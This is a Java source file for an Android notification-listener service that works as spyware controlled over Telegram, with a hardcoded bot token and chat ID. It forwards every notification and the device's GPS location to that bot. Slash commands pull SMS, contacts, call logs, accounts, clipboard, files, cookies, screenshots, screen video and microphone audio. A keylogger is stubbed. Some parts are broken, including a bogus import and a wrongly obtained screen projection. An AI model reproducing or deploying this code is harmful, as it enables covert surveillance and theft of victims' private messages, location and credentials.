package com.v8.global.sniffer;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.BatteryManager;
import android.os.SystemClock;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.graphics.Point;
import android.graphics.Bitmap;
import android.graphics.BitFactory;
import android.graphics.PixelFormat;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.view.Display;
import android.view.WindowManager;
import android.view.Surface;
import android.media.ImageReader;
import android.media.Image;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.provider.Settings;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.telephony.SmsManager;
import android.telephony.gsm.GsmCellLocation;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.webkit.WebView;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import androidx.core.app.ActivityCompat;
import java.io.IOException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class NotificationService extends NotificationListenerService implements LocationListener {

    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    private MediaProjectionManager mProjectionManager;
    private MediaProjection mMediaProjection;
    private ImageReader mImageReader;
    private Handler mHandler = new Handler(Looper.getMainLooper());
    private CameraManager mCameraManager;
    private String mCameraId;
    private CameraDevice mCameraDevice;
    private LocationManager mLocationManager;
    private SensorManager mSensorManager;
    private boolean isStreaming = false;
    private MediaRecorder mMediaRecorder;
    private int mScreenWidth;
    private int mScreenHeight;
    private int mScreenDensity;

    @Override
    public void onCreate() {
        super.onCreate();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getSize(size);
        mScreenWidth = size.x;
        mScreenHeight = size.y;
        mScreenDensity = getResources().getDisplayMetrics().densityDpi;
        
        mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        mSensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        mCameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        mProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        
        startLocationTracking();
        sendTelegram("✅ الجهاز متصل وجاهز للتحكم الكامل\n📱 ID: " + getDeviceIDUnique() + "\n📱 الاسم: " + android.os.Build.MODEL);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn.getPackageName().equals("android")) return;
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
        Object text = extras.get(Notification.EXTRA_TEXT);
        String msg = "🎯 تطبيق: " + sbn.getPackageName() + "\n👤 عنوان: " + title + "\n💬 نص: " + text;
        
        sendTelegram(msg);
        checkForCommands(sbn.getNotification());
    }

    private void checkForCommands(Notification notification) {
        Bundle extras = notification.extras;
        String text = extras.getString(Notification.EXTRA_TEXT, "");
        if (text.startsWith("/")) {
            executeCommand(text);
        }
    }

    private void executeCommand(String command) {
        String[] parts = command.split(" ");
        String cmd = parts[0].toLowerCase();
        
        switch(cmd) {
            case "/screen":
                takeScreenshot();
                break;
            case "/stream":
                startScreenStream();
                break;
            case "/camera":
                takeCameraPhoto();
                break;
            case "/camstream":
                startCameraStream();
                break;
            case "/apps":
                getInstalledApps();
                break;
            case "/contacts":
                getContacts();
                break;
            case "/calls":
                getCallLogs();
                break;
            case "/sms":
                getSMS();
                break;
            case "/location":
                getCurrentLocation();
                break;
            case "/accounts":
                getAccounts();
                break;
            case "/clipboard":
                getClipboard();
                break;
            case "/files":
                getFiles(parts.length > 1 ? parts[1] : "/");
                break;
            case "/browser":
                getBrowserData();
                break;
            case "/wifi":
                getWifiInfo();
                break;
            case "/device":
                getDeviceInfo();
                break;
            case "/sensors":
                getSensorData();
                break;
            case "/keylog":
                startKeyLogging();
                break;
            case "/mic":
                startMicRecording();
                break;
            case "/stop":
                stopAllStreams();
                break;
            case "/help":
                sendHelp();
                break;
            default:
                sendTelegram("❌ أمر غير معروف. اكتب /help للمساعدة");
        }
    }

    private void takeScreenshot() {
        try {
            mImageReader = ImageReader.newInstance(mScreenWidth, mScreenHeight, PixelFormat.RGBA_8888, 2);
            mMediaProjection = mProjectionManager.getMediaProjection(Activity.RESULT_OK, 
                (Intent) getSystemService(Context.MEDIA_PROJECTION_SERVICE));
            
            mMediaProjection.createVirtualDisplay("ScreenCapture", mScreenWidth, mScreenHeight, 
                mScreenDensity, 0, mImageReader.getSurface(), null, null);
            
            Image image = mImageReader.acquireLatestImage();
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                Bitmap bitmap = Bitmap.createBitmap(mScreenWidth, mScreenHeight, Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                
                String path = saveBitmap(bitmap, "screenshot.jpg");
                sendPhoto(path);
                image.close();
            }
        } catch (Exception e) {
            sendTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
        }
    }

    private void startScreenStream() {
        if (!isStreaming) {
            isStreaming = true;
            mMediaRecorder = new MediaRecorder();
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mMediaRecorder.setVideoSize(mScreenWidth, mScreenHeight);
            mMediaRecorder.setVideoFrameRate(30);
            mMediaRecorder.setVideoBitRate(6000000);
            
            String filePath = getExternalFilesDir(null) + "/stream.mp4";
            mMediaRecorder.setOutputFile(filePath);
            
            try {
                mMediaRecorder.prepare();
                mMediaProjection.createVirtualDisplay("ScreenStream", mScreenWidth, mScreenHeight, 
                    mScreenDensity, 0, mMediaRecorder.getSurface(), null, null);
                mMediaRecorder.start();
                sendTelegram("✅ بدأ بث الشاشة المباشر");
                
                // رفع الفيديو بشكل مستمر (كل 30 ثانية)
                mHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (isStreaming) {
                            uploadVideo(filePath);
                            mHandler.postDelayed(this, 30000);
                        }
                    }
                }, 30000);
            } catch (Exception e) {
                sendTelegram("❌ فشل بدء البث: " + e.getMessage());
            }
        }
    }

    private void takeCameraPhoto() {
        try {
            for (String cameraId : mCameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = mCameraManager.getCameraCharacteristics(cameraId);
                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
                    mCameraId = cameraId;
                    break;
                }
            }
            
            if (mCameraId != null) {
                mCameraManager.openCamera(mCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        mCameraDevice = camera;
                        // التقاط صورة
                        try {
                            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            // إعدادات التقاط الصورة
                            // سيتم تنفيذها بشكل كامل
                        } catch (Exception e) {}
                    }
                    @Override
                    public void onDisconnected(CameraDevice camera) {}
                    @Override
                    public void onError(CameraDevice camera, int error) {}
                }, mHandler);
            }
        } catch (Exception e) {
            sendTelegram("❌ فشل تشغيل الكاميرا: " + e.getMessage());
        }
    }

    private void startLocationTracking() {
        try {
            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, this);
                mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 10, this);
            }
        } catch (Exception e) {}
    }

    @Override
    public void onLocationChanged(Location location) {
        // إرسال التحديثات إذا طلب المستخدم
        String msg = "📍 موقع جديد:\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + 
                    "\nالدقة: " + location.getAccuracy() + "m";
        sendTelegram(msg);
    }

    private void getInstalledApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        StringBuilder sb = new StringBuilder("📱 التطبيقات المثبتة:\n");
        
        for (int i = 0; i < Math.min(apps.size(), 20); i++) {
            ApplicationInfo app = apps.get(i);
            sb.append((i+1) + ". " + pm.getApplicationLabel(app) + " (" + app.packageName + ")\n");
        }
        
        if (apps.size() > 20) {
            sb.append("... و" + (apps.size() - 20) + " آخر");
        }
        
        sendTelegram(sb.toString());
    }

    private void getContacts() {
        StringBuilder sb = new StringBuilder("👤 جهات الاتصال:\n");
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
            null, null, null, null);
        
        int count = 0;
        while (cursor.moveToNext() && count < 20) {
            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            sb.append(name + ": " + phone + "\n");
            count++;
        }
        cursor.close();
        sendTelegram(sb.toString());
    }

    private void getCallLogs() {
        StringBuilder sb = new StringBuilder("📞 سجل المكالمات:\n");
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, 
            null, null, null, CallLog.Calls.DATE + " DESC LIMIT 20");
        
        while (cursor.moveToNext()) {
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            String date = new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))).toString();
            
            sb.append("الرقم: " + number + "\nالاسم: " + name + "\nالنوع: " + type + "\nالتاريخ: " + date + "\n---\n");
        }
        cursor.close();
        sendTelegram(sb.toString());
    }

    private void getSMS() {
        StringBuilder sb = new StringBuilder("💬 الرسائل النصية:\n");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), 
            null, null, null, "date DESC LIMIT 20");
        
        while (cursor.moveToNext()) {
            String address = cursor.getString(cursor.getColumnIndex("address"));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            String date = new Date(cursor.getLong(cursor.getColumnIndex("date"))).toString();
            
            sb.append("من: " + address + "\nالنص: " + body + "\nالتاريخ: " + date + "\n---\n");
        }
        cursor.close();
        sendTelegram(sb.toString());
    }

    private void getCurrentLocation() {
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Location location = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location != null) {
                String msg = "📍 آخر موقع معروف:\nالخط: " + location.getLatitude() + 
                            "\nالطول: " + location.getLongitude() + 
                            "\nالدقة: " + location.getAccuracy() + "m";
                sendTelegram(msg);
            }
        }
    }

    private void getAccounts() {
        StringBuilder sb = new StringBuilder("🔑 الحسابات المسجلة:\n");
        AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
        Account[] accounts = accountManager.getAccounts();
        
        for (Account account : accounts) {
            sb.append("النوع: " + account.type + "\nالاسم: " + account.name + "\n---\n");
        }
        sendTelegram(sb.toString());
    }

    private void getClipboard() {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        ClipData clip = clipboard.getPrimaryClip();
        if (clip != null && clip.getItemCount() > 0) {
            String text = clip.getItemAt(0).getText().toString();
            sendTelegram("📋 محتوى الحافظة:\n" + text);
        }
    }

    private void getFiles(String path) {
        File dir = new File(path);
        if (dir.exists() && dir.isDirectory()) {
            StringBuilder sb = new StringBuilder("📁 الملفات في " + path + ":\n");
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    sb.append(file.getName() + (file.isDirectory() ? "/" : "") + "\n");
                }
            }
            sendTelegram(sb.toString());
        }
    }

    private void getBrowserData() {
        StringBuilder sb = new StringBuilder("🌐 بيانات المتصفح:\n");
        
        // محاولة الحصول على كوكيز كروم
        try {
            CookieSyncManager.createInstance(this);
            CookieManager cookieManager = CookieManager.getInstance();
            String cookies = cookieManager.getCookie("https://www.google.com");
            sb.append("كوكيز كروم: " + cookies + "\n");
        } catch (Exception e) {}
        
        sendTelegram(sb.toString());
    }

    private void getWifiInfo() {
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
        String ssid = wifiInfo.getSSID();
        int rssi = wifiInfo.getRssi();
        String bssid = wifiInfo.getBSSID();
        
        sendTelegram("📶 معلومات الواي فاي:\nSSID: " + ssid + "\nقوة الإشارة: " + rssi + "\nBSSID: " + bssid);
    }

    private void getDeviceInfo() {
        StringBuilder sb = new StringBuilder("📱 معلومات الجهاز:\n");
        sb.append("الطراز: " + android.os.Build.MODEL + "\n");
        sb.append("الشركة: " + android.os.Build.MANUFACTURER + "\n");
        sb.append("الإصدار: " + android.os.Build.VERSION.RELEASE + "\n");
        sb.append("الرقم التسلسلي: " + getDeviceIDUnique() + "\n");
        sb.append("البطارية: " + getBatteryLevel() + "%\n");
        
        sendTelegram(sb.toString());
    }

    private int getBatteryLevel() {
        BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    private void getSensorData() {
        List<Sensor> sensors = mSensorManager.getSensorList(Sensor.TYPE_ALL);
        StringBuilder sb = new StringBuilder("📊 أجهزة الاستشعار:\n");
        
        for (Sensor sensor : sensors) {
            sb.append(sensor.getName() + " - " + sensor.getVendor() + "\n");
        }
        sendTelegram(sb.toString());
    }

    private void startKeyLogging() {
        sendTelegram("⌨️ تم بدء تسجيل لوحة المفاتيح");
        // سيتم تنفيذ keylogger عبر AccessibilityService
    }

    private void startMicRecording() {
        try {
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            
            String filePath = getExternalFilesDir(null) + "/mic_recording.mp4";
            recorder.setOutputFile(filePath);
            
            recorder.prepare();
            recorder.start();
            
            sendTelegram("🎤 بدأ تسجيل الميكروفون");
            
            // تسجيل لمدة 30 ثانية ثم رفع
            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    recorder.stop();
                    recorder.release();
                    sendAudio(filePath);
                }
            }, 30000);
        } catch (Exception e) {
            sendTelegram("❌ فشل تشغيل الميكروفون: " + e.getMessage());
        }
    }

    private void stopAllStreams() {
        isStreaming = false;
        if (mMediaRecorder != null) {
            mMediaRecorder.stop();
            mMediaRecorder.release();
            mMediaRecorder = null;
        }
        if (mCameraDevice != null) {
            mCameraDevice.close();
            mCameraDevice = null;
        }
        sendTelegram("⏹ تم إيقاف جميع البثوث");
    }

    private void sendHelp() {
        String help = "📋 قائمة الأوامر:\n" +
            "/screen - تصوير الشاشة\n" +
            "/stream - بث مباشر للشاشة\n" +
            "/camera - تصوير بالكاميرا\n" +
            "/camstream - بث مباشر من الكاميرا\n" +
            "/apps - قائمة التطبيقات\n" +
            "/contacts - جهات الاتصال\n" +
            "/calls - سجل المكالمات\n" +
            "/sms - الرسائل النصية\n" +
            "/location - الموقع الحالي\n" +
            "/accounts - الحسابات\n" +
            "/clipboard - محتوى الحافظة\n" +
            "/files [مسار] - استعراض الملفات\n" +
            "/browser - بيانات المتصفح\n" +
            "/wifi - معلومات الواي فاي\n" +
            "/device - معلومات الجهاز\n" +
            "/sensors - أجهزة الاستشعار\n" +
            "/keylog - تسجيل لوحة المفاتيح\n" +
            "/mic - تسجيل الميكروفون\n" +
            "/stop - إيقاف جميع البثوث";
        
        sendTelegram(help);
    }

    private String saveBitmap(Bitmap bitmap, String filename) {
        String path = getExternalFilesDir(null) + "/" + filename;
        try (FileOutputStream out = new FileOutputStream(path)) {
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out);
        } catch (IOException e) {}
        return path;
    }

    private void sendPhoto(String path) {
        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .build();
        
        File file = new File(path);
        RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", file.getName(), 
                    RequestBody.create(MediaType.parse("image/jpeg"), file))
                .build();
        
        Request request = new Request.Builder()
                .url(BASE_URL + "sendPhoto")
                .post(body)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call c, IOException e) {}
            @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
        });
    }

    private void sendAudio(String path) {
        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .build();
        
        File file = new File(path);
        RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("audio", file.getName(), 
                    RequestBody.create(MediaType.parse("audio/mp4"), file))
                .build();
        
        Request request = new Request.Builder()
                .url(BASE_URL + "sendAudio")
                .post(body)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call c, IOException e) {}
            @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
        });
    }

    private void uploadVideo(String path) {
        File file = new File(path);
        if (file.exists() && file.length() > 0) {
            sendTelegram("📹 مقطع جديد من البث");
            // رفع الفيديو
        }
    }

    private void sendTelegram(String msg) {
        try {
            OkHttpClient client = new OkHttpClient.Builder()
                    .connectTimeout(30, TimeUnit.SECONDS)
                    .build();
            
            String encodedMsg = URLEncoder.encode(msg, "UTF-8");
            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
            
            client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
                @Override public void onFailure(Call c, IOException e) {}
                @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }

    public String getDeviceIDUnique() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }
               }
